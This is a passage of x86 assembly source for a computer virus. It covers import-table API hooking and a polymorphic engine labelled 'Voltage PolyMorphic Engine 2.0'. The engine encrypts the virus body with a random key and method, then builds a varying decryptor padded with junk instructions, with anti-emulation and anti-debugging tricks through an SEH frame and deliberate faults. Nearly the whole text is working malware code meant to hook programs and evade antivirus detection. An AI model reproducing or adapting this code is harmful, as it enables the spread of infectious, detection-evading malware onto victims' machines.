	pushad
	xchg	edi,ebx
	xor	ecx,ecx
@Gsize:	cmp	byte ptr [edi+ecx],0h		;get our dll size
	je	_Size
	inc	ecx
	jmp	@Gsize
_Size:	rep	cmpsb
	je	_dll
	popad
	add	eax,14h				;move to next IMAGE_IMPORT_DESCRIPTOR structure
	jmp	@Dll
_dll:	popad
	;edx - Hook procedure
	;ecx - function to hook
	;eax - IMAGE_IMPORT_DESCRIPTOR of our api dll
	;[esp]	- image base
	mov	ebx,[eax]			;get rva to pointers to image import by name structures
	add	ebx,[esp]			;convert it to va
	xor	edi,edi				;used to save loop index
@FindApi:
	;ebx - pointer to pointers arrary of import by name structures
	push	edi				;save loop index
	push	ebx				;save pointer to import by name structures
	push	eax				;save import section rva
	push	ecx				;save function to hook name
	push	edx				;save hook procedure
	mov	esi,[ebx]			;get import by name structure rva
	add	esi,[esp + 14h]			;convert it to va
	add	esi,2h				;skip the IBN_Hint
	mov	edi,ecx				;move our api name into edi
	xor	ecx,ecx				;used to save our api name size
@GSize_:cmp	byte ptr [edi + ecx],0h		;did we in the end ?
	je	___Size
	inc	ecx
	jmp	@GSize_
___Size:inc	ecx				;include the 0
	rep	cmpsb				;compare api names
	je	ApiFound			;we found it !
	pop	edx
	pop	ecx
	pop	eax
	pop	ebx
	pop	edi
	add	edi,4h
	add	ebx,4h				;move to next pointer
	cmp	dword ptr [ebx],0h		;no more pointers ???
	jne	@FindApi
HookErr_:
	pop	eax
HookErr:xor	eax,eax
	ret
ApiFound:
	pop	edx
	pop	ecx
	pop	eax
	pop	ebx
	pop	edi
	mov	esi,[eax + 10h]			;rva to name
	add	esi,[esp]
	add	esi,edi				;goto our api address
	mov	eax,[esi]			;get our api old address
	mov	[esi],edx			;hook it !
	pop	esi				;restore stack
	ret

;---------------------------------------------------------------------------

;Voltage PolyMorphic Engine,Version 2.0:
;---------------------------------------
;encrypt code with 4 bytes key with diffrent way each time
;and create polymorphic decryptor,the polymorphic decryptor
;has diffrent instructions that do the same thing mixed with
;junk code,with anti emulation/debuggin tricks


CreateDecryptor:
	call	InitRandomNumber	;init random number generator
	call	GenRandomNumber
	and	eax,1f40h		;get random numebr between 0 ~ 8000
	cmp	eax,7d0h
	ja	NextM
	mov	byte ptr [ebp + EncryptionMethod],1h ;use not
	jmp	EncryptVirus
NextM:	cmp	eax,0fa0h
	ja	NextM2
	mov	byte ptr [ebp + EncryptionMethod],2h ;use add
	jmp	EncryptVirus
NextM2:	cmp	eax,1770h
	ja	NextM3
	mov	byte ptr [ebp + EncryptionMethod],3h ;use sub
	jmp	EncryptVirus
NextM3:	mov	byte ptr [ebp + EncryptionMethod],4h ;use xor
EncryptVirus:
	call	GenRandomNumber
	mov	dword ptr [ebp + key],eax	;get random key
	xor	eax,eax
	mov	ecx,SizeOfDataToEncrypt		;size of data in words
	mov	edi,[ebp + StartOfDataToEncrypt]
	mov	esi,edi
@enc:	lodsd
	cmp	byte ptr [ebp + EncryptionMethod],1h	;is not	?
	jne	NextE
	not	eax
	jmp	_stosw
NextE:	cmp	byte ptr [ebp + EncryptionMethod],2h	;is add ?
	jne	NextE2
	add	eax,dword ptr [ebp + key]
	jmp	_stosw
NextE2:	cmp	byte ptr [ebp + EncryptionMethod],3h	;is sub	?
	jne	NextE4
	sub	eax,dword ptr [ebp + key]
	jmp	_stosw
NextE4: xor	eax,dword ptr [ebp + key]		;xor
_stosw:	stosd
	loop	@enc
	mov	edi,[ebp + WhereToWriteDecryptor]
	call	WriteInstruction1
	call	WriteJunkCode
	call	WriteInstruction2
	call	WriteJunkCode
	call	WriteInstruction3
	call	WriteJunkCode
	call	WriteInstruction4
	call	WriteJunkCode
	mov	dword ptr [ebp + PolyBuffer],edi	;saved for loop
	call	WriteInstruction5
	call	WriteJunkCode
	call	WriteInstruction6
	call	WriteJunkCode
	call	WriteInstruction7
	call	WriteJunkCode
	call	WriteInstruction8
	call	WriteJunkCode
	call	WriteInstruction9
	call	WriteJunkCode
	ret
	
	EncryptionMethod	db	0	;1=not 2=add 3=sub 4=xor
	key			dd	0
	WhereToWriteDecryptor	dd	0
	StartOfDataToEncrypt	dd	0
	ProgramImageBase	dd	0
	PolyBuffer		dd	0
	SizeOfDataToEncrypt	equ	(VirusSize/4);virus size in dwords
	FixRVA			dd	0
		
WriteInstruction1:
	;this function write pushad instruction
	mov	byte ptr [edi],60h	;pushad
	inc	edi
	ret
WriteInstruction2:
	;this function set esi register to start of encrypted virus
	call	GenRandomNumber
	mov	ebx,[ebp + StartOfDataToEncrypt]
	sub	ebx,[ebp + mapbase]
	add	ebx,[ebp + ProgramImageBase]
	add	ebx,[ebp + FixRVA]
	and	eax,0ffh		;get random number between 0 ~ 255
	cmp	eax,33h
	ja	ins2_1
	mov	byte ptr [edi],0beh	;way 1:
	mov	dword ptr [edi + 1],ebx	;mov esi,StartOfDataToEncrypt
	add	edi,5h
	jmp	retins2
ins2_1:	cmp	eax,66h
	ja	ins2_2
	mov	byte ptr [edi],68h	;way 2:
	mov	dword ptr [edi + 1],ebx	;push	StartOfDataToEncrypt
	add	edi,5h
	call	WriteJunkCode		;pop	esi
	mov	byte ptr [edi],5eh
	inc	edi
	jmp	retins2
ins2_2:	cmp	eax,99h
	ja	ins2_3
	mov	word ptr [edi],0f633h	;way 3:
	add	edi,2h			;xor esi,esi
	push	ebx
	call	WriteJunkCode
	pop	ebx
	call	_ins2oresival
	jmp	retins2
ins2_3:	cmp	eax,0cch
	ja	ins2_4
	mov	word ptr [edi],0f62bh	;way 4
	add	edi,2h			;sub esi,esi
	push	ebx
	call	WriteJunkCode
	pop	ebx
	call	_ins2oresival		
	jmp	retins2
ins2_4:	not	ebx			;way 5
	mov	byte ptr [edi],0beh	;mov esi,not StartOfDataToEncrypt
	mov	dword ptr [edi + 1],ebx	
	add	edi,5h
	call	WriteJunkCode
	mov	word ptr [edi],0d6f7h	;not esi
	add	edi,2h
retins2:ret
_ins2oresival:
	;write or esi,StartOfDataToEncrypt instruction
	mov	word ptr [edi],0ce81h
	mov	dword ptr [edi + 2],ebx
	add	edi,6h
	ret
	
WriteInstruction3:
	;this function set edi register to esi register
	call	GenRandomNumber
	and	eax,0c8h
	cmp	eax,32h
	ja	ins3_1
	mov	word ptr [edi],0fe8bh	;mov edi,esi
	add	edi,2h
	jmp	retins3
ins3_1: cmp	eax,64h
	ja	ins3_2
	mov	byte ptr [edi],56h	;push esi
	inc	edi
	call	WriteJunkCode
	mov	byte ptr [edi],5fh	;pop edi
	inc	edi
	jmp	retins3
ins3_2:	cmp	eax,96h
	ja	ins3_3
	mov	word ptr [edi],0fe87h	;xchg edi esi
	add	edi,2h
	call	WriteJunkCode
	mov	word ptr [edi],0f78bh	;mov esi,edi
	add	edi,2h
	jmp	retins3
ins3_3:	mov	word ptr [edi],0f787h	;xchg edi esi
	add	edi,2h
	call	WriteJunkCode
	mov	word ptr [edi],0f78bh	;mov esi,edi
	add	edi,2h
retins3:ret

WriteInstruction4:
	;this function set ecx with the size of the virus in dwords
	call	GenRandomNumber
	mov	ebx,SizeOfDataToEncrypt
	and	eax,0ffh
	cmp	eax,33h
	ja	ins4_1
	mov	byte ptr [edi],0b9h	;mov ecx,sizeofvirusindwords
	mov	dword ptr [edi + 1],ebx
	add	edi,5h
	jmp	retins4	
ins4_1:	cmp	eax,66h
	ja	ins4_2
	mov	byte ptr [edi],68h	;push sizeofvirusindwords
	mov	dword ptr [edi + 1],ebx
	add	edi,5h
	call	WriteJunkCode
	mov	byte ptr [edi],59h	;pop ecx
	inc	edi
	jmp	retins4	
ins4_2:	cmp	eax,99h
	ja	ins4_3
	mov	word ptr [edi],0c933h	;xor ecx,ecx
	add	edi,2h
	push	ebx
	call	WriteJunkCode
	pop	ebx
	call	_ins4orecxval
	jmp	retins4	
ins4_3:	cmp	eax,0cch
	ja	ins4_4
	mov	word ptr [edi],0c92bh	;sub ecx,ecx
	add	edi,2h
	push	ebx
	call	WriteJunkCode
	pop	ebx
	call	_ins4orecxval
	jmp	retins4
ins4_4: not	ebx
	mov	byte ptr [edi],0b9h	;mov ecx,not sizeofvirusindwords
	mov	dword ptr [edi + 1],ebx
	add	edi,5h
	call	WriteJunkCode
	mov	word ptr [edi],0d1f7h
	add	edi,2h
retins4:ret
_ins4orecxval:
	mov	word ptr [edi],0c981h
	mov	dword ptr [edi + 2],ebx
	add	edi,6h
	ret
WriteInstruction5:
	;this function read 4 bytes from [esi] into eax
	;and add to esi register 4 (if there is need to do so).
	call	GenRandomNumber
	and	eax,12ch
	cmp	eax,64h
	ja	ins5_1
	mov	byte ptr [edi],0adh	;lodsd
	inc	edi
	jmp	retins5
ins5_1:	cmp	eax,0c8h
	ja	ins5_2
	mov	word ptr [edi],068bh	;mov eax,dword ptr [esi]
	add	edi,2h
	call	_ins5addesi4
	jmp	retins5
ins5_2:	mov	word ptr [edi],36ffh	;push dword ptr [esi]
	add	edi,2h
	call	WriteJunkCode
	mov	byte ptr [edi],58h	;pop eax
	inc	edi
	call	_ins5addesi4
retins5:ret

_ins5addesi4:
	;this function write add to esi register 4
	call	GenRandomNumber
	and	eax,64h
	cmp	eax,32h
	ja	addesi4_2
	mov	word ptr [edi],0c683h	;way 1
	mov	byte ptr [edi + 2],4h	;add esi,4h
	add	edi,3h
	jmp	raddesi
addesi4_2:
	mov	ecx,4h		;way 2
@incesi:mov	byte ptr [edi],46h
	inc	edi
	call	WriteJunkCode
	loop	@incesi
raddesi:ret


WriteInstruction6:
	;this function decrypt the value of eax
	mov	ebx,dword ptr [ebp + key]
	cmp	byte ptr [ebp + EncryptionMethod],1h
	jne	ins6_1
	mov	word ptr [edi],0d0f7h	;not eax
	add	edi,2h
	jmp	retins6
ins6_1:	cmp	byte ptr [ebp + EncryptionMethod],2h
	jne	ins6_2
	mov	byte ptr [edi],2dh	;sub eax,key
	mov	dword ptr [edi + 1],ebx
	add	edi,5h
	jmp	retins6
ins6_2:	cmp	byte ptr [ebp + EncryptionMethod],3h
	jne	ins6_3
	mov	byte ptr [edi],05h	;add eax,key
	mov	dword ptr [edi + 1],ebx
	add	edi,5h
	jmp	retins6
ins6_3:	mov	byte ptr [edi],35h
	mov	dword ptr [edi + 1],ebx ;xor eax,key
	add	edi,5h
	jmp	retins6
retins6:ret




WriteInstruction7:
	;this function copy the value of eax to [edi]
	call	GenRandomNumber
	and	eax,258h
	cmp	eax,0c8h
	ja	ins7_1
	mov	byte ptr [edi],0abh	;stosd
	inc	edi
	jmp	retins7
ins7_1:	cmp	eax,190h
	ja	ins7_2
	mov	word ptr [edi],0789h	;mov dword ptr [edi],eax
	add	edi,2h
	call	WriteJunkCode
	call	addedi4
	jmp	retins7
ins7_2:	mov	byte ptr [edi],50h	;push eax
	inc	edi
	call	WriteJunkCode
	mov	word ptr [edi],078fh	;pop dword ptr [edi]
	add	edi,2h
	call	addedi4
retins7:ret

addedi4:
	call	GenRandomNumber
	and	eax,12ch
	cmp	eax,96h
	ja	_addedi4
	mov	word ptr [edi],0c783h
	mov	byte ptr [edi + 2],4h
	add	edi,3h
	jmp	retins7a
_addedi4:
	mov	ecx,4h
@incedi:mov	byte ptr [edi],47h	;inc edi
	inc	edi
	call	WriteJunkCode
	loop	@incedi
retins7a:ret


WriteInstruction8:
	;this function write the loop instruction of the decryptor
	call	GenRandomNumber
	and	eax,12ch
	cmp	eax,96h
	ja	ins8_1
	mov	byte ptr [edi],49h	;dec ecx
	inc	edi
	call	WriteJunkCode
	mov	word ptr [edi],0f983h
	mov	byte ptr [edi + 2],0h	;cmp ecx,0h
	add	edi,3h
	mov	eax,dword ptr [ebp + PolyBuffer]
	sub	eax,edi
	mov	byte ptr [edi],75h	;jne
	sub	eax,2h
	mov	byte ptr [edi + 1],al
	add	edi,2h
	jmp	retins8
ins8_1:	mov	eax,dword ptr [ebp + PolyBuffer]
	sub	eax,edi
	mov	byte ptr [edi],0e2h	;loop
	sub	eax,2h
	mov	byte ptr [edi + 1],al
	add	edi,2h
retins8:ret


WriteInstruction9:
	;this istruction write a code in the stack,that jump into virus code
	call	GenRandomNumber
	mov	ebx,[ebp + StartOfDataToEncrypt]
	sub	ebx,[ebp + mapbase]
	add	ebx,[ebp + ProgramImageBase]
	add	ebx,[ebp + FixRVA]			;offset to jump
	mov	dword ptr [ebp + push_and_ret + 1],ebx	;save address
	;push 'push offset' & 'ret' instructions to the stack
	;way 1:
	;	push xxx
	;	push xxx
	;way 2:
	;	mov	reg,xxx
	;	push	reg
	;	mov	reg,xxx
	;	push	reg
	;way 3:
	;	mov	reg,xored xxx
	;	push	reg
	;	xor	dword ptr [esp],xored val
	;	mov	reg,xored xxx
	;	push	reg
	;	xor	dword ptr [esp],xored val
	;------------------------------------------------------
	and	eax,4b0h
	cmp	eax,190h
	ja	I9_A
	xor	ecx,ecx				;way 1 !!!
	mov	cx,word ptr [ebp + push_and_ret+4]
	mov	byte ptr [edi],68h
	mov	dword ptr [edi + 1h],ecx	;gen push xxx
	add	edi,5h
	call	WriteJunkCode
	xor	ecx,ecx
	mov	ecx,dword ptr [ebp + push_and_ret]
	mov	byte ptr [edi],68h
	mov	dword ptr [edi +1h],ecx		;gen push xxx
	add	edi,5h	
	jmp	I9_Exit
I9_A:	cmp	eax,320h
	ja	I9_B
	xor	eax,eax
	mov	ax,word ptr [ebp + push_and_ret+4]
	call	GenMoveAndPush
	xor	eax,eax
	mov	eax,dword ptr [ebp + push_and_ret]
	call	GenMoveAndPush
	jmp	I9_Exit
I9_B:	call	GenRandomNumber
	xchg	ebx,eax
	xor	eax,eax
	mov	ax,word ptr [ebp + push_and_ret+4]
	xor	eax,ebx
	call	GenMoveAndPush
	call	_WriteJunkCode
	mov	al,81h
	stosb
	mov	ax,2434h
	stosw
	xchg	ebx,eax
	push	eax
	stosd
	xor	eax,eax
	mov	eax,dword ptr [ebp + push_and_ret]
	xor	eax,dword ptr [esp]
	call	GenMoveAndPush
	call	_WriteJunkCode
	pop	ebx
	mov	al,81h
	stosb
	mov	ax,2434h
	stosw
	xchg	ebx,eax
	stosd
I9_Exit:
	Call	WriteJunkCode
	;gen a SEH frame that jump into the stack
	;----------------------------------------
	;gen 'push esp'
	;way 1:
	;	push	esp
	;way 2:
	;	mov	reg,esp
	;	push	reg
	;------------------------------------------
	call	GenRandomNumber
	and	eax,4b0h			;get number between 0 ~ 1200
	cmp	eax,258h
	ja	_PushEsp1
	mov	al,54h				;push	esp
	stosb
	jmp	___1__	
_PushEsp1:	
	call	GenRandomNumber			;way 2:
	and	eax,7h				;move reg,esp
	push	eax				;push reg
	mov	ecx,8h
	mul	ecx
	xchg	al,ah
	add	ah,0c4h
	mov	al,8bh
	stosw
	call	_WriteJunkCode
	pop	eax
	add	al,50h
	stosb
___1__:	
	call	WriteJunkCode
	;gen 'push dword ptr fs:[0]'
	;way 1:
	;	push	dword ptr fs:[0]
	;way 2:
	;	xor/sub reg,reg
	;	push	dword ptr fs:[reg]
	;way 3:
	;	xor/sub reg,reg
	;	push	dword ptr fs:[reg+reg]
	;--------------------------------------------
	call	GenRandomNumber
	and	eax,4b0h
	cmp	eax,190h
	ja	_nW
	mov	eax,36FF6764h
	stosd
	xor	eax,eax
	stosw
	jmp	NextIns
_nW:	cmp	eax,320h
	ja	_nW2
	call	GenEmptyReg
	push	ecx
	call	_WriteJunkCode
	pop	ecx
	sub	ch,0c0h
	xor	eax,eax
	mov	al,ch
	mov	ecx,9h
	div	ecx
	xchg	al,cl
	mov	ax,0ff64h
	stosw
	xchg	al,cl
	add	al,30h
	stosb
	jmp	NextIns
_nW2:	call	GenEmptyReg
	push	ecx
	call	_WriteJunkCode
	pop	ecx
	sub	ch,0c0h
	xchg	ah,ch
	mov	al,34h
	shl	eax,10h
	mov	ax,0ff64h
	stosd
NextIns:	
	call	WriteJunkCode
	;gen 'mov fs:[0],esp
	;way 1:
	;	mov fs:[0],esp
	;way 2:
	;	xor/sub reg,reg
	;	mov fs:[reg],esp
	;way 3:
	;	mov reg,esp
	;	mov fs:[0],reg
	;---------------------------------------------
	call	GenRandomNumber
	and	eax,4b0h
	cmp	eax,190h
	ja	__nW1
	mov	eax,26896764h
	stosd
	xor	eax,eax
	stosw
	jmp	GenF
__nW1:	cmp	eax,320h
	ja	__nW2
	call	GenEmptyReg
	sub	ch,0c0h
	push	ecx
	call	_WriteJunkCode
	pop	ecx
	xor	eax,eax
	mov	al,ch
	mov	ecx,9h
	div	ecx
	push	eax
	mov	ax,8964h
	stosw
	pop	eax
	add	al,20h
	stosb
	jmp	GenF
__nW2:	call	GenMovRegEsp
	push	ecx
	call	_WriteJunkCode
	pop	ecx
	add	cl,0eh
	mov	eax,89676400h
	mov	al,cl
	ror	eax,8h
	stosd
	xor	eax,eax
	stosw
GenF:	
	;gen 'page fault',in order to jump
	;way 1:
	;	int 3
	;way 2:
	;	ud2	-> undefine instruction (0fh,0bh)
	;way 3:
	;	mov ecx,0\xor ecx,ecx\sub ecx\ecx
	;	div	ecx
	;--------------------------------------------------------
	call	GenRandomNumber
	and	eax,384h
	cmp	eax,12ch
	ja	_F_1
	mov	al,0cch
	stosb
	jmp	ExitGF
_F_1:	cmp	eax,258h
	ja	_F_2
	mov	ax,0b0fh
	stosw
	jmp	ExitGF
_F_2:	call	GenRandomNumber
	and	eax,384h
	cmp	eax,12ch
	ja	_ecx0_1
	mov	al,0b9h
	stosb
	xor	eax,eax
	stosd
	jmp	div_ecx
_ecx0_1:cmp	eax,258h
	ja	_ecx0_2
	mov	ax,0c92bh
	stosw
	jmp	div_ecx
_ecx0_2:mov	ax,0c933h
	stosw
div_ecx:call	WriteJunkCode
	mov	ax,0f1f7h
	stosw
ExitGF:	ret

	;instructions to generate in the stack:
	push_and_ret	db	68h,0,0,0,0,0c3h

	
_WriteJunkCode:		;gen junk code that dont destroy registers
	call	GenRandomNumber
	and	eax,5208h
	cmp	eax,0bb8h
	ja	_WJC1
	call	GenAndReg
	jmp	ExitJC
_WJC1:	cmp	eax,1770h
	ja	_WJC2
	call	GenJump
	jmp	ExitJC
_WJC2:	cmp	eax,2328h
	ja	_WJC3
	call	GenPushPop
	jmp	ExitJC
_WJC3:	cmp	eax,2ee0h
	ja	_WJC4
	call	GenIncDec
	jmp	ExitJC
_WJC4:	cmp	eax,3a98h
	ja	_WJC5
	call	GenMoveRegReg
	jmp	ExitJC
_WJC5:	call	OneByte
ExitJC:	ret

;output cl:reg id
GenMovRegEsp:
	call	GenRandomNumber
	and	eax,00000600h
	mov	ecx,8h
	mul	ecx
	mov	cl,ah
	add	ah,0cch
	mov	al,8bh
	stosw
	ret	

;output ch:reg id
GenEmptyReg:
	call	GenRandomNumber
	xor	ecx,ecx
	and	eax,5208h	
	cmp	eax,0bb8h
	ja	_ER
	mov	ch,0c0h
	jmp	_ER_
_ER:	cmp	eax,1770h
	ja	_ER2
	mov	ch,0dbh
	jmp	_ER_
_ER2:	cmp	eax,2328h
	ja	_ER3
	mov	ch,0c9h
	jmp	_ER_
_ER3:	cmp	eax,2ee0h
	ja	_ER4
	mov	ch,0d2h
	jmp	_ER_
_ER4:	cmp	eax,3a98h
	ja	_ER5
	mov	ch,0ffh
	jmp	_ER_
_ER5:	mov	ch,0f6h
_ER_:	call	GenRandomNumber
	cmp	ah,80h
	ja	_ER__
	mov	cl,33h
	jmp	_E_R
_ER__:	mov	cl,2bh
_E_R:	mov	ax,cx
	stosw	
	ret
	

GenMoveAndPush:
	push	eax				;number to mov & push
No_Esp:	call	GenRandomNumber
	and	al,7h
	mov	cl,al
	add	al,0b8h
	cmp	al,0bch
	je	No_Esp
	stosb
	pop	eax
	stosd
	push	ecx
	call	_WriteJunkCode			;gen junk between the mov and the push
	pop	eax
	add	al,50h
	stosb
	ret
		
InitRandomNumber:
	call	[ebp + GetTickCount]
	mov	dword ptr [ebp + RandomNumber],eax
	ret
	RandomNumber	dd	0
GenRandomNumber:				;a simple random num generator
	pushad
	mov	eax,dword ptr [ebp + RandomNumber]
	and	eax,12345678h
	mov	cl,ah
	ror	eax,cl
	add	eax,98765abdh
	mov	ecx,12345678h
	mul	ecx
	add	eax,edx
	xchg	ah,al
	sub	eax,edx
	mov	dword ptr [ebp + RandomNumber],eax
	popad
	mov	eax,dword ptr [ebp + RandomNumber]
	ret

WriteJunkCode:
	call	GenRandomNumber			;split this procedure
	and	eax,3e8h			;to four procedure's
	cmp	eax,0fah			;in order to give each
	ja	_jnk1				;junkcode the same chance
	call	WriteJunkCode1
	jmp	ExitJunk
_jnk1:	cmp	eax,1f4h
	ja	_jnk2
	call	WriteJunkCode2
	jmp	ExitJunk
_jnk2:	cmp	eax,2eeh
	ja	_jnk3
	call	WriteJunkCode3
	jmp	ExitJunk
_jnk3:	call	WriteJunkCode4
ExitJunk:ret




WriteJunkCode1:
	call	GenRandomNumber
	and	eax,3e8h
	cmp	eax,0fah
	ja	_jnk_1
	call	GenAndReg	;1
	jmp	ExtJunk1
_jnk_1:	cmp	eax,1f4h
	ja	_jnk_2
	call	GenJump		;2
	jmp	ExtJunk1
_jnk_2:	cmp	eax,2eeh
	ja	_jnk_3
	call	GenPushPop	;3
	jmp	ExtJunk1
_jnk_3:	call	GenIncDec	;4
ExtJunk1:ret
	
	
WriteJunkCode2:
	call	GenRandomNumber
	and	eax,3e8h
	cmp	eax,0fah
	ja	_jn_k1
	call	GenMoveRegReg	;5
	jmp	ExtJunk2
_jn_k1:	cmp	eax,1f4h
	ja	_jn_k2
	call	GenAnd		;6
	jmp	ExtJunk2
_jn_k2:	cmp	eax,2eeh
	ja	_jn_k3
	call	GenMove		;7
	jmp	ExtJunk2
_jn_k3:	call	GenPushTrashPopReg	;8
ExtJunk2:ret
	
	
WriteJunkCode3:
	call	GenRandomNumber
	and	eax,3e8h
	cmp	eax,0fah
	ja	_j_nk1
	call	GenShrReg	;9
	jmp	ExtJunk3
_j_nk1:	cmp	eax,1f4h
	ja	_j_nk2
	call	GenShlReg	;10
	jmp	ExtJunk3
_j_nk2:	cmp	eax,2eeh
	ja	_j_nk3
	call	GenRorReg	;11
	jmp	ExtJunk3
_j_nk3:	call	GenRolReg	;12
ExtJunk3:ret
	
	
WriteJunkCode4:
	call	GenRandomNumber
	and	eax,3e8h
	cmp	eax,0fah
	ja	__jnk1
	call	GenOrReg	;13
	jmp	ExtJunk4
__jnk1:	cmp	eax,1f4h
	ja	__jnk2
	call	GenXorReg	;14
	jmp	ExtJunk4
__jnk2:	cmp	eax,2eeh
	ja	__jnk3
	call	GenSubAddTrash	;15
	jmp	ExtJunk4
__jnk3:	call	OneByte		;16
ExtJunk4:ret




GenAndReg:
	;this function generate and reg,reg instruction
	call	GenRandomNumber
	and	eax,1f40h
	cmp	eax,3e8h
	ja	and2
	mov	ah,0c0h
	jmp	exitand
and2:	cmp	eax,7d0h
	ja	and3
	mov	ah,0dbh
	jmp	exitand
and3:	cmp	eax,0bb8h
	ja	and4
	mov	ah,0c9h
	jmp	exitand
and4:	cmp	eax,0fa0h
	ja	and5
	mov	ah,0d2h
	jmp	exitand
and5:	cmp	eax,1388
	ja	and6
	mov	ah,0ffh
	jmp	exitand
and6:	cmp	eax,1770h
	ja	and7
	mov	ah,0f6h
	jmp	exitand
and7:	cmp	eax,1b58h
	ja	and8
	mov	ah,0edh
	jmp	exitand
and8:	mov	ah,0e4h
exitand:mov	al,23h
	stosw
	ret

GenJump:
	;this function generate do nothing condition jump
	call	GenRandomNumber
	and	eax,0fh
	add	eax,70h
	stosw
	ret

GenPushPop:
	;this function generate push reg \ pop reg instruction
	call	GenRandomNumber
	and	eax,7h
	add	eax,50h
	stosb
	add	eax,8h
	stosb
	ret

GenIncDec:
	;this function generate:inc reg\dec reg or dec reg\inc reg instruction
	call	GenRandomNumber
	cmp	al,7fh
	ja	decinc
	and	eax,7h
	add	eax,40h
	stosb
	add	eax,8h
	stosb
	jmp	exitincd
decinc:	and	eax,7h
	add	eax,48h
	mov	byte ptr [edi],al
	stosb
	sub	eax,8h
	mov	byte ptr [edi],al
	stosb
exitincd:ret


GenMoveRegReg:			;gen mov reg,reg
	call	GenRandomNumber
	and	eax,1f40h
	cmp	eax,3e8h
	ja	mreg2
	mov	ah,0c0h
	jmp	exitmreg
mreg2:	cmp	eax,7d0h
	ja	mreg3
	mov	ah,0dbh
	jmp	exitmreg
mreg3:	cmp	eax,0bb8h
	ja	mreg4
	mov	ah,0c9h
	jmp	exitmreg
mreg4:	cmp	eax,0fa0h
	ja	mreg5
	mov	ah,0d2h
	jmp	exitmreg
mreg5:	cmp	eax,1388
	ja	mreg6
	mov	ah,0ffh
	jmp	exitmreg
mreg6:	cmp	eax,1770h
	ja	mreg7
	mov	ah,0f6h
	jmp	exitmreg
mreg7:	cmp	eax,1b58h
	ja	mreg8
	mov	ah,0edh
	jmp	exitmreg
mreg8:	mov	ah,0e4h
exitmreg:
	mov	al,8bh
	stosw
	ret
	
GenAnd:
	;this function generate and ebx\edx\ebp,trash instruction
	call	GenRandomNumber
	push	eax
	cmp	al,50h
	ja	nand1
	mov	ah,0e3h
	jmp	wand
nand1:	cmp	al,0a0h
	ja	nand2
	mov	ah,0e2h
	jmp	wand
nand2:	mov	ah,0e5h
wand:	mov	al,81h
	stosw
	pop	eax
	stosd
	ret
	
GenMove:
	;this function generate mov ebx\edx\ebp,trash instruction
	call	GenRandomNumber
	push	eax
	cmp	al,50h
	ja	nmov1
	mov	al,0bbh
	jmp	wmov
nmov1:	cmp	al,0a0h
	ja	nmov2
	mov	al,0bah
	jmp	wmov
nmov2:	mov	al,0bdh
wmov:	stosb
	pop	eax
	stosd
	ret

GenPushTrashPopReg:
	;this function generate push trash\ pop ebp\ebx\edx instruction
	call	GenRandomNumber
	mov	byte ptr [edi],68h
	inc	edi
	stosd
	cmp	al,55h
	ja	nextpt
	mov	byte ptr [edi],5dh
	jmp	wpop
nextpt:	cmp	al,0aah
	ja	nextpt2
	mov	byte ptr [edi],5ah
	jmp	wpop
nextpt2:mov	byte ptr [edi],5bh
wpop:	inc	edi
	ret	
	
GenShrReg:				;gen shr unusedreg,num
	call	GenRandomNumber
	mov	byte ptr [edi],0c1h
	inc	edi
	cmp	al,50h
	ja	nshr
	mov	byte ptr [edi],0edh
	jmp	wshr
nshr:	cmp	al,0a0h
	ja	nshr2
	mov	byte ptr [edi],0eah
	jmp	wshr
nshr2:	mov	byte ptr [edi],0ebh
wshr:	inc	edi
	stosb
	ret
	
GenShlReg:				;gen shl unusedreg,num
	call	GenRandomNumber
	mov	byte ptr [edi],0c1h
	inc	edi
	cmp	al,50h
	ja	nshl
	mov	byte ptr [edi],0e3h
	jmp	wshl
nshl:	cmp	al,0a0h
	ja	nshl2
	mov	byte ptr [edi],0e2h
	jmp	wshl
nshl2:	mov	byte ptr [edi],0e5h
wshl:	inc	edi
	stosb
	ret
	
GenRorReg:				;gen ror unusedreg,num
	call	GenRandomNumber
	mov	byte ptr [edi],0c1h
	inc	edi
	cmp	al,50h
	ja	nror
	mov	byte ptr [edi],0cbh
	jmp	wror
nror:	cmp	al,0a0h
	ja	nror2
	mov	byte ptr [edi],0cah
	jmp	wror
nror2:	mov	byte ptr [edi],0cdh
wror:	inc	edi
	stosb
	ret
	
	
GenRolReg:				;gen rol unusedreg,num
	call	GenRandomNumber
	mov	byte ptr [edi],0c1h
	inc	edi
	cmp	al,50h
	ja	nrol
	mov	byte ptr [edi],0c3h
	jmp	wrol
nrol:	cmp	al,0a0h
	ja	nrol2
	mov	byte ptr [edi],0c2h
	jmp	wrol
nrol2:	mov	byte ptr [edi],0c5h
wrol:	inc	edi
	stosb
	ret
	
GenOrReg:				;gen or unusedreg,num
	call	GenRandomNumber
	push	eax
	mov	al,81h
	cmp	ah,50h
	ja	nor
	mov	ah,0cbh
	jmp	wor
nor:	cmp	ah,0a0h
	ja	nor2
	mov	ah,0cah
	jmp	wor
nor2:	mov	ah,0cdh
wor:	stosw
	pop	eax
	stosd
	ret

GenXorReg:				;gen xor unusedreg,num
	call	GenRandomNumber
	push	eax
	mov	al,81h
	cmp	ah,50h
	ja	nXor
	mov	ah,0f3h
	jmp	wXor
nXor:	cmp	ah,0a0h
	ja	nXor2
	mov	ah,0f2h
	jmp	wXor
nXor2:	mov	ah,0f5h
wXor:	stosw
	pop	eax
	stosd
	ret


GenSubAddTrash:				;gen add reg,num\sub reg,num
noesp:	call	GenRandomNumber
	mov	ebx,eax
	cmp	al,80h
	ja	sub_f
	and	ah,7h
	add	ah,0c0h
	cmp	ah,0c4h
	je	noesp
	mov	al,81h
	stosw
	mov	eax,ebx
	stosd
	mov	eax,ebx
	and	ah,7h
	add	ah,0e8h
	mov	al,81h
	stosw
	mov	eax,ebx
	stosd
	jmp	exitsa
sub_f:	and	ah,7h
	add	ah,0e8h
	cmp	ah,0ech
	je	noesp
	mov	al,81h
	stosw
	mov	eax,ebx
	stosd
	mov	eax,ebx
	and	ah,7h
	add	ah,0c0h
	mov	al,81h
	stosw
	mov	eax,ebx
	stosd
exitsa:	ret

OneByte:				;gen one byte do nothing instruction
	call	GenRandomNumber
	cmp	al,32h
	ja	byte1
	mov	al,90h
	jmp	end_get_byte
byte1:	cmp	al,64h
	ja	byte2
	mov	al,0f8h
	jmp	end_get_byte
byte2:	cmp	al,96h
	ja	byte3
	mov	al,0f5h
	jmp	end_get_byte
byte3:	cmp	al,0c8h
	ja	byte4
	mov	al,0f9h
	jmp	end_get_byte
byte4:	mov	al,0fch
end_get_byte:
	stosb
	ret


;------------------------------------------------------------------------------------
	
	db	10h	dup(?)		;padding

	VirusEnd	equ	$

FirstGen:
	push	0h
	push	offset Message
	push	offset Title_
	push	0h
	call	MessageBoxA
	push	0h
	call	GetModuleHandleA
	push	eax
	call	ExitProcess
	
